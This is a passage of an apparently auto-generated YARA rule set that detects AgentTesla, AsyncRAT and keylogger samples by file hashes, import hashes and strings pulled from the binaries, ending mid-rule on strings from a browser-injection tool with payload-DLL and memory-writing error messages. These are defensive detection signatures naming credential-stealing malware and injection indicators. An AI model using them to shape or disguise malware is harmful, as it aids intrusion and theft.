      hash3 = "b8d639465f33fa8d4dd8ed11a6c2d5e4ce849c4a8f4acb0fc6b6b030163c4eb2"
   strings:
      $s1 = "john.doe@email.com" fullword wide /* score: '21.00'*/
      $s2 = "jane.smith@email.com" fullword wide /* score: '21.00'*/
      $s3 = "Contact Details - " fullword wide /* score: '12.00'*/
      $s4 = "contacts.xml" fullword wide /* score: '10.00'*/
      $s5 = "First Name,Last Name,Phone,Email,Company,Job Title,Address,Notes" fullword wide /* score: '10.00'*/
      $s6 = "GetAllContacts" fullword ascii /* score: '9.00'*/
      $s7 = "GetContactCount" fullword ascii /* score: '9.00'*/
      $s8 = "<GetContactById>b__0" fullword ascii /* score: '9.00'*/
      $s9 = "<GetAllContacts>b__3_0" fullword ascii /* score: '9.00'*/
      $s10 = "<GetRecentContacts>b__10_0" fullword ascii /* score: '9.00'*/
      $s11 = "GetContactById" fullword ascii /* score: '9.00'*/
      $s12 = "<GetAllContacts>b__3_1" fullword ascii /* score: '9.00'*/
      $s13 = "GetRecentContacts" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _9a06f0024c1694774ae97311608bab5b_imphash__AgentTesla_signature__ccc8dfebc5d9971e8491d80ecc850a15_imphash__AsyncRAT_signatur_56 {
   meta:
      description = "_subset_batch - from files 9a06f0024c1694774ae97311608bab5b(imphash).exe, AgentTesla(signature)_ccc8dfebc5d9971e8491d80ecc850a15(imphash).exe, AsyncRAT(signature)_b4a3b157700e07d805d7f946a6215505(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b5887e126bce96f2fb30abe3d085b83ebdf99e4d89f7fb24b0da6d4c98cc9873"
      hash2 = "134d4c6cd667d14ed0fb492442a5d759bc2878bacad500c6eb638f3343b02ec2"
      hash3 = "5e088f3ae8bf2631e5aaa8de2facd537a65ef5e269924213e14ee41d94b6a446"
   strings:
      $s1 = "Alt+ Clipboard does not support Icons/Menu '%s' is already being used by another formDocked control must have a name%Error remo" wide /* score: '16.00'*/
      $s2 = "clWebDarkMagenta" fullword ascii /* score: '14.00'*/
      $s3 = "Stream write error\"Unable to find a Table of Contents" fullword wide /* score: '14.00'*/
      $s4 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\FontSubstitutes" fullword ascii /* score: '12.00'*/
      $s5 = "\\SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts\\" fullword ascii /* score: '11.00'*/
      $s6 = "Write$Error creating variant or safe array!'%s' is not a valid integer value" fullword wide /* score: '10.00'*/
      $s7 = "clWebDarkRed" fullword ascii /* score: '9.00'*/
      $s8 = "clWebDarkSeaGreen" fullword ascii /* score: '9.00'*/
      $s9 = "clWebDarkKhaki" fullword ascii /* score: '9.00'*/
      $s10 = "clWebDarkTurquoise" fullword ascii /* score: '9.00'*/
      $s11 = "clWebGhostWhite" fullword ascii /* score: '9.00'*/
      $s12 = "clWebDarkViolet" fullword ascii /* score: '9.00'*/
      $s13 = "clWebDarkBlue" fullword ascii /* score: '9.00'*/
      $s14 = "clWebDarkGoldenRod" fullword ascii /* score: '9.00'*/
      $s15 = "clWebDarkSlategray" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__594d7c9b_a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5_57 {
   meta:
      description = "_subset_batch - from files a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_594d7c9b.exe, a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_877ce367.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7369f1ec.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "594d7c9be217c40ab8953121b50db5a7b858df82e0d2b3893598cfa097629037"
      hash2 = "877ce367ca9c8219fec30540624b7ffe9a57123d91d8346bd30d050a19afafb4"
      hash3 = "7369f1ecdd1305ca16ce7bf837f0fff74acde94cb2fa2a5b3dc9500c061f6077"
   strings:
      $s1 = "Login_And_Register_Form" fullword ascii /* score: '15.00'*/
      $s2 = "frmLogin" fullword ascii /* score: '15.00'*/
      $s3 = "Login_And_Register_Form.registerForm.resources" fullword ascii /* score: '15.00'*/
      $s4 = "Login_And_Register_Form.frmLogin.resources" fullword ascii /* score: '15.00'*/
      $s5 = "Login_And_Register_Form.Properties.Resources.resources" fullword ascii /* score: '15.00'*/
      $s6 = "Login_And_Register_Form.Properties" fullword ascii /* score: '15.00'*/
      $s7 = "chckbxPassword_CheckedChanged" fullword ascii /* score: '12.00'*/
      $s8 = "chckbxPassword" fullword ascii /* score: '12.00'*/
      $s9 = "3336333$333" fullword ascii /* score: '9.00'*/ /* hex encoded string '36333' */
      $s10 = "PrecisionSoft Technologies" fullword wide /* score: '9.00'*/
      $s11 = "PrecisionSoft Technologies 2025" fullword wide /* score: '9.00'*/
      $s12 = "btneight" fullword ascii /* score: '8.00'*/
      $s13 = "btnsqrt" fullword ascii /* score: '8.00'*/
      $s14 = "btnbackspace" fullword ascii /* score: '8.00'*/
      $s15 = "btnnine" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _a763e16f8a534c9c9ccd5ffca2c48fffa70ca02122983885922d3ad0a1063def_a763e16f_AgentTesla_signature__AgentTesla_signature__2b350_58 {
   meta:
      description = "_subset_batch - from files a763e16f8a534c9c9ccd5ffca2c48fffa70ca02122983885922d3ad0a1063def_a763e16f.vbs, AgentTesla(signature).vbs, AgentTesla(signature)_2b350953.vbs, AgentTesla(signature)_5878cdf1.vbs, AgentTesla(signature)_6f42f8cc.vbs, AgentTesla(signature)_d5065447.vbs, AgentTesla(signature)_d72d8f1c.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a763e16f8a534c9c9ccd5ffca2c48fffa70ca02122983885922d3ad0a1063def"
      hash2 = "567f768cff1b5969e082271fd31ed9bd6d1b264ba2f2525937e12006a5569977"
      hash3 = "2b3509532532cd02f563e5129d63cc86c4b2aac21439ffbbca8d82d5319b41c1"
      hash4 = "5878cdf159acf243c6e537ecc308b726dc68d281f5d638b6d1dacb2c32a26692"
      hash5 = "6f42f8cc868d9102b1ecd404c9f7635dd1241c56781ca0d7bc0235b6e998e65d"
      hash6 = "d50654478707bcd080e6f5097a82ca953f1271f18bda8c6a331bbbdeac43170b"
      hash7 = "d72d8f1ce2e960c2dc643bd570c8fdd66d7b4e2e6918ed5eb726c0251e963a41"
   strings:
      $s1 = "' Internal method - Process a completely parsed event" fullword ascii /* score: '26.00'*/
      $s2 = "SSMON_LogError \"SMTP Error Detected: Error \" & Err.Number & \": \" & Err.Description & \" Source: \" & Err.Source" fullword ascii /* score: '23.00'*/
      $s3 = "WshShell.LogEvent 1, in_strMessage" fullword ascii /* score: '21.00'*/
      $s4 = "Private Sub ProcessEvent" fullword ascii /* score: '18.00'*/
      $s5 = "SSMON_LogError \"MapNetworkDrive Error Detected: Error \" & Err.Number & \": \" & Err.Description & \" Source: \" & Err.Source" fullword ascii /* score: '18.00'*/
      $s6 = "WScript.Arguments.ShowUsage" fullword ascii /* score: '18.00'*/
      $s7 = "' Log any SMTP errors" fullword ascii /* score: '17.00'*/
      $s8 = "= in_xmlElement.getAttribute( \"serverPassword\" )" fullword ascii /* score: '17.00'*/
      $s9 = "= in_xmlElement.getAttribute( \"reportPeriodMinutes\" ) + 0" fullword ascii /* score: '16.00'*/
      $s10 = "= in_xmlElement.getAttribute( \"serverPort\" ) + 0" fullword ascii /* score: '16.00'*/
      $s11 = "' SMTP 'To' email address. Multiple addresses are separated by commas" fullword ascii /* score: '15.00'*/
      $s12 = "End Sub ' ProcessEvent" fullword ascii /* score: '15.00'*/
      $s13 = "If Not WScript.Arguments.Named.Exists(\"ConfigFile\") Then" fullword ascii /* score: '13.00'*/
      $s14 = "= in_xmlElement.getAttribute( \"formatAsHtml\" ) + 0" fullword ascii /* score: '13.00'*/
      $s15 = "WScript.Quit( 1 )" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__56ffbbdda63dbdf1891621098d41e68d_imphash__AgentTesla_signat_59 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, AgentTesla(signature)_fdfd597602a97b999259741e5480e514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash3 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
      hash4 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash5 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash6 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
      hash7 = "27d0c0261bf8a7f0dbbf04d60e775834b7150294e25f15f99c679dc1a1663be9"
   strings:
      $s1 = "HDateTimeOffsetTimeZonePostProcessing" fullword ascii /* score: '20.00'*/
      $s2 = "GetDateOfNNDS*ProcessDateTimeSuffix" fullword ascii /* score: '20.00'*/
      $s3 = "DGetWrongValueTypeArgumentException.GetKeyNotFoundException" fullword ascii /* score: '15.00'*/
      $s4 = "4ProcessHebrewTerminalState" fullword ascii /* score: '15.00'*/
      $s5 = "(ProcessTerminalState" fullword ascii /* score: '15.00'*/
      $s6 = "targetTyp" fullword wide /* score: '14.00'*/
      $s7 = "@GetWrongKeyTypeArgumentException" fullword ascii /* score: '12.00'*/
      $s8 = "GetRegularToken@" fullword ascii /* score: '12.00'*/
      $s9 = "\"GetSeparatorToken@" fullword ascii /* score: '12.00'*/
      $s10 = "GetEraName.get_AbbreviatedEraNames*GetAbbreviatedEraName<get_AbbreviatedEnglishEraNames\"get_DateSeparator.get_FullDateTimePatte" ascii /* score: '12.00'*/
      $s11 = ":InternalGetGenitiveMonthNames:InternalGetLeapYearMonthNames&GetCombinedPatterns" fullword ascii /* score: '12.00'*/
      $s12 = "GetEraName.get_AbbreviatedEraNames*GetAbbreviatedEraName<get_AbbreviatedEnglishEraNames\"get_DateSeparator.get_FullDateTimePatte" ascii /* score: '12.00'*/
      $s13 = "ScanDateWord$GetDateWordsOfDTFI@" fullword ascii /* score: '10.00'*/
      $s14 = "2get_HasForceTwoDigitYears&YearMonthAdjustment@" fullword ascii /* score: '9.00'*/
      $s15 = ",VerifyValidPunctuation(GetYearMonthDayOrder" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__719bb222f4bbc8859273f71b5809958a_imphash__AgentTesla_signat_60 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash3 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash4 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
   strings:
      $s1 = "@System.Security.Cryptography.dllFSystem.Private.Reflection.Execution" fullword ascii /* score: '28.00'*/
      $s2 = "        publickekeytokenublickeyretargetrgetablecontentttenttypewindowsrsruntime," fullword wide /* score: '26.00'*/
      $s3 = "BSystem.Collections.Concurrent.dll:System.Collections.NonGeneric" fullword ascii /* score: '22.00'*/
      $s4 = ".get_ShouldLogInEventLog" fullword ascii /* score: '20.00'*/
      $s5 = "System.Linq.Expressions, Version=9.0.0.0, Culture=neutral, PublicKey=00240000048000009400000006020000002400005253413100040000010" wide /* score: '20.00'*/
      $s6 = "System.Collections.Generic.IEnumerator<System.Collections.Generic.KeyValuePair<TKey,TValue>>.get_Current.SwapIfGreaterWithValues" ascii /* score: '18.00'*/
      $s7 = "InsertionSortHSystem.Collections.IComparer.Compare@" fullword ascii /* score: '17.00'*/
      $s8 = "zSystem.Collections.Generic.IEnumerable<TSource>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s9 = "ZThrowNotSupportedInlineArrayEqualsGetHashCode" fullword ascii /* score: '15.00'*/
      $s10 = ":TryParseProcessorArchitecture" fullword ascii /* score: '15.00'*/
      $s11 = ",<CreateDelegate>b__8_0<GetCustomMethodInvokerIfNeeded" fullword ascii /* score: '13.00'*/
      $s12 = "ExitAll(TryInitializeStatics4EnterAndGetCurrentThreadId@" fullword ascii /* score: '12.00'*/
      $s13 = "LastIndexOf(GetSystemArrayEEType" fullword ascii /* score: '12.00'*/
      $s14 = "X509StoreFX509SubjectAlternativeNameExtensionBX509SubjectKeyIdentifierExtension6CryptDecodeObjectStructType" fullword ascii /* score: '12.00'*/
      $s15 = "TryGetNextToken@" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imph_61 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bd58b37d.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fb0e6001.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f179047bce749b1e5558cc83fefe1364c9e7a8b3bdded23e80c3c7bd3b79235c"
      hash2 = "bd58b37d8db7fcdb3da5c5633598df6d0908863b5050b6aec25b67c566a6137e"
      hash3 = "fb0e6001dc8c00fd0768162baf0af2786ad2ba8da5f0d6a470cbfdf8bf5238e6"
   strings:
      $s1 = "paint.net 4.0.134" fullword ascii /* score: '10.00'*/
      $s2 = "<GetTopScores>b__4_0" fullword ascii /* score: '9.00'*/
      $s3 = "get_DateAchieved" fullword ascii /* score: '9.00'*/
      $s4 = "GetHighestScore" fullword ascii /* score: '9.00'*/
      $s5 = "<GetAllScores>b__5_0" fullword ascii /* score: '9.00'*/
      $s6 = "<GetHighestScore>b__9_0" fullword ascii /* score: '9.00'*/
      $s7 = "<GetTopScores>b__4_1" fullword ascii /* score: '9.00'*/
      $s8 = "GetAllScores" fullword ascii /* score: '9.00'*/
      $s9 = "GetScrambledWord" fullword ascii /* score: '9.00'*/
      $s10 = "Game Complete" fullword wide /* score: '9.00'*/
      $s11 = "{0}. {1} - {2} points" fullword wide /* score: '9.00'*/
      $s12 = "7+ letter words" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__78921759_a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5_62 {
   meta:
      description = "_subset_batch - from files a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_78921759.exe, a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_94b39cc6.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_331b4062.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f1722328.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "789217599c1f3acfa58bde73eca30d4f0bd9c8184fdfe37ffa7339d321cfe266"
      hash2 = "94b39cc6fa738eb8a26185ee588d5998a7f82b39a67a7312f5202a3e4ee7af78"
      hash3 = "331b4062e2bd91848560e3d76e2ad7f34fec3be595f3925f9eb45326085966e7"
      hash4 = "f1722328c89de2120f7cab86b9f88e4129fb7e419c8c0c699d43317553692de7"
   strings:
      $s1 = "Unit Converter - Conversion History Report" fullword wide /* score: '20.00'*/
      $s2 = "Conversion History - Unit Converter" fullword wide /* score: '17.00'*/
      $s3 = "Unsupported file format. Use .csv or .txt" fullword wide /* score: '14.00'*/
      $s4 = "Settings - Unit Converter" fullword wide /* score: '14.00'*/
      $s5 = "ConversionHistory_{0:yyyyMMdd}.csv" fullword wide /* score: '13.00'*/
      $s6 = "Export Conversion History" fullword wide /* score: '12.00'*/
      $s7 = "Kilogram" fullword wide /* score: '11.00'*/
      $s8 = "Temperature unit '" fullword wide /* score: '11.00'*/
      $s9 = "Total Conversions: {0}" fullword wide /* score: '9.00'*/
      $s10 = "Dark Theme" fullword wide /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( all of them )
      ) or ( all of them )
}

rule _a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__741be14a_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5_63 {
   meta:
      description = "_subset_batch - from files a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_741be14a.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a5dd168a.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fe805a99.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "741be14a5cfa6754257b0c372718ae5831353b6967164dcb7e95f163e5a3ece8"
      hash2 = "a5dd168a825506e616ba3601e4511e6348f52b7b3168dbc8d3d199fe7a3b84f1"
      hash3 = "fe805a9919d5721043c3395e167a1c5f0693feff210825d1fe99a240a2bb16dc"
   strings:
      $s1 = "\\userscore.bin" fullword wide /* score: '19.00'*/
      $s2 = "GetUserScore" fullword ascii /* score: '17.00'*/
      $s3 = "ProcessWord" fullword ascii /* score: '15.00'*/
      $s4 = "get_KeyMatrix" fullword ascii /* score: '12.00'*/
      $s5 = "get_EnterKey" fullword ascii /* score: '12.00'*/
      $s6 = "get_KeyDictionary" fullword ascii /* score: '12.00'*/
      $s7 = "get_BackKey" fullword ascii /* score: '12.00'*/
      $s8 = "SaveUserScore" fullword ascii /* score: '12.00'*/
      $s9 = "_rectangleLogoOffset" fullword ascii /* score: '9.00'*/
      $s10 = "_darkPen" fullword ascii /* score: '9.00'*/
      $s11 = "get_help_FILL0_wght300_GRAD0_opsz48" fullword ascii /* score: '9.00'*/
      $s12 = "get_restart_alt_FILL0_wght400_GRAD0_opsz48" fullword ascii /* score: '9.00'*/
      $s13 = "GetWordList" fullword ascii /* score: '9.00'*/
      $s14 = "GetAnswerList" fullword ascii /* score: '9.00'*/
      $s15 = "get_NumberOfGuesses" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__057cca90_AgentTesla_signature__1e90a0e0769973c9f8edd53d008ca694_imphash__AgentTesla_signature__25e306_64 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_057cca90.tar, AgentTesla(signature)_1e90a0e0769973c9f8edd53d008ca694(imphash).exe, AgentTesla(signature)_25e3064d3ad9ad1f40911fe3d3c5c65f(imphash).exe, AgentTesla(signature)_462a1c4623dd5653cfbabfcb88d6bdd9(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_57a57b52c398ba0bf2f72c7ddb5a9e1e(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, AgentTesla(signature)_792661c7a60d6624adab7be57ff57e58(imphash).exe, AgentTesla(signature)_bb4d11c9.tar, AgentTesla(signature)_fcf36bf30437909fd62937df8a303a93(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "057cca90c1c6379e12d4723722c8143dbfba3490920d77944ff6d864869bef05"
      hash2 = "3276db816ba3eecb3cc996d09f2333f10c93b1e895276f4953664e7a3dbc4b47"
      hash3 = "0700f6ba7bbe9b9ed0ac97747b56d75da3d2b942a697ddb11344f39f28464177"
      hash4 = "e4da512f9f4983b8fe80ba952531414acccd5b037c2c8488055c159c7b88b0c4"
      hash5 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash6 = "8603da5c311b08b5868e22b6f495dca6f2925e5582403d59ba9fb617d34c1c1b"
      hash7 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
      hash8 = "7d8a20d5f8a916da554fb667337a6f0413dac138a09332d59ebbbb05bc7cfe48"
      hash9 = "bb4d11c9981fbf16b12cf1731ff24da3f0f5127bb363fb9cc55b50d8e977f3b2"
      hash10 = "33f5967acccf0ba4bca1b2305d022590aeecdf55427d055c79918f5f88ffe620"
   strings:
      $x1 = "System.Windows.Forms.Design.ComponentDocumentDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f1" ascii /* score: '34.00'*/
      $x2 = "System.Windows.Forms.Design.ComponentDocumentDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f1" ascii /* score: '34.00'*/
      $x3 = "System.ComponentModel.ComponentConverter, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '34.00'*/
      $s4 = "System.Collections.Generic.IEnumerator<System.Runtime.Loader.LibraryNameVariation>.get_Current@" fullword ascii /* score: '24.00'*/
      $s5 = "ExecutionDomain(ExecutionEnvironment" fullword ascii /* score: '16.00'*/
      $s6 = "System.Collections.Generic.IEnumerator<Internal.Reflection.Core.QScopeDefinition>.get_Current@" fullword ascii /* score: '15.00'*/
      $s7 = "System.Collections.Generic.IEnumerator<Internal.Metadata.NativeFormat.NamespaceDefinitionHandle>.get_Current@" fullword ascii /* score: '15.00'*/
      $s8 = " GetTypeForwarder@" fullword ascii /* score: '14.00'*/
      $s9 = "GetHashCodeImpl<FastGetValueTypeHashCodeHelper" fullword ascii /* score: '12.00'*/
      $s10 = "8RhGetCurrentThreadStackTrace" fullword ascii /* score: '12.00'*/
      $s11 = "fGetRuntimeInterfacesAlgorithmForNonPointerArrayType@" fullword ascii /* score: '12.00'*/
      $s12 = ",IComparisonOperators`3" fullword ascii /* score: '12.00'*/
      $s13 = "RhGetThunkSize2RhGetRuntimeHelperForType" fullword ascii /* score: '12.00'*/
      $s14 = ":GetRandomizedEqualityComparer@" fullword ascii /* score: '12.00'*/
      $s15 = "LCreateThreadLocalContentionCountObject" fullword ascii /* score: '11.00'*/
   condition:
      ( ( uint16(0) == 0x5550 or uint16(0) == 0x5a4d or uint16(0) == 0x4f50 ) and filesize < 19000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__462a1c4623dd5653cfbabfcb88d6bdd9_imphash__AgentTesla_signat_65 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_462a1c4623dd5653cfbabfcb88d6bdd9(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_792661c7a60d6624adab7be57ff57e58(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_9eeb76c5ed4b34e66260a9300680a9c0(imphash).exe, AgentTesla(signature)_bb4d11c9.tar, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, AgentTesla(signature)_fcf36bf30437909fd62937df8a303a93(imphash).exe, AgentTesla(signature)_fdfd597602a97b999259741e5480e514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "e4da512f9f4983b8fe80ba952531414acccd5b037c2c8488055c159c7b88b0c4"
      hash3 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash4 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
      hash5 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash6 = "7d8a20d5f8a916da554fb667337a6f0413dac138a09332d59ebbbb05bc7cfe48"
      hash7 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash8 = "2d3689a4a57ad183e445b7221da670b17264aea9090dd0c9735db5ce285e2ddc"
      hash9 = "bb4d11c9981fbf16b12cf1731ff24da3f0f5127bb363fb9cc55b50d8e977f3b2"
      hash10 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
      hash11 = "33f5967acccf0ba4bca1b2305d022590aeecdf55427d055c79918f5f88ffe620"
      hash12 = "27d0c0261bf8a7f0dbbf04d60e775834b7150294e25f15f99c679dc1a1663be9"
   strings:
      $s1 = "System.Collections.Generic.IEnumerable<System.Reflection.CustomAttributeData>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s2 = "System.Collections.Generic.IEnumerator<System.Reflection.PropertyInfo>.get_Current@" fullword ascii /* score: '15.00'*/
      $s3 = "<InitializeUserDefaultUICultureLGetCultureNotSupportedExceptionMessage0CreateCultureInfoNoThrow" fullword ascii /* score: '15.00'*/
      $s4 = "System.Collections.Generic.IEnumerable<System.Reflection.PropertyInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s5 = "System.Collections.Generic.IEnumerator<System.Reflection.CustomAttributeData>.get_Current@" fullword ascii /* score: '15.00'*/
      $s6 = "SetHashCode.InitializeCurrentThread" fullword ascii /* score: '13.00'*/
      $s7 = ",GetCurrentOneYearLocal,GetOneYearLocalFromUtc@" fullword ascii /* score: '13.00'*/
      $s8 = ">CompareAdjustmentRuleToDateTime@" fullword ascii /* score: '10.00'*/
      $s9 = "get_Setter@" fullword ascii /* score: '9.00'*/
      $s10 = ">TryGetTimeZoneEntryFromRegistry" fullword ascii /* score: '9.00'*/
      $s11 = "DGetDaylightSavingsEndOffsetFromUtc" fullword ascii /* score: '9.00'*/
      $s12 = "GetDaylightTime@" fullword ascii /* score: '9.00'*/
      $s13 = "\"GetPropertyMethod@" fullword ascii /* score: '9.00'*/
      $s14 = "get_Getter@" fullword ascii /* score: '9.00'*/
      $s15 = "$GetIsAmbiguousTime GetIsInvalidTime" fullword ascii /* score: '9.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x4f50 ) and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _b27c17408902acbcf9ce079d41811097_imphash__b27c17408902acbcf9ce079d41811097_imphash__b3b85573_66 {
   meta:
      description = "_subset_batch - from files b27c17408902acbcf9ce079d41811097(imphash).exe, b27c17408902acbcf9ce079d41811097(imphash)_b3b85573.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "918edabc1eb61b08fae0595697b4b849bdefebd9fbdca458bd7a09c2a378aefc"
      hash2 = "b3b855732697058049396a74151c9073df5ba93165200f219a046d5003714d62"
   strings:
      $s1 = "Failed to determine target process architecture." fullword ascii /* score: '28.00'*/
      $s2 = "User-Agent: BrowserInjector/1.0" fullword ascii /* score: '27.00'*/
      $s3 = "GetModuleHandleW for ntdll.dll failed." fullword ascii /* score: '24.00'*/
      $s4 = "brave.exe" fullword wide /* score: '22.00'*/
      $s5 = "NtWriteVirtualMemory for payload DLL failed: " fullword ascii /* score: '21.00'*/
      $s6 = "CreateProcessW failed. Error: " fullword ascii /* score: '18.00'*/
      $s7 = "Error processing browser " fullword ascii /* score: '18.00'*/
      $s8 = " PAYLOAD_DLL" fullword wide /* score: '18.00'*/
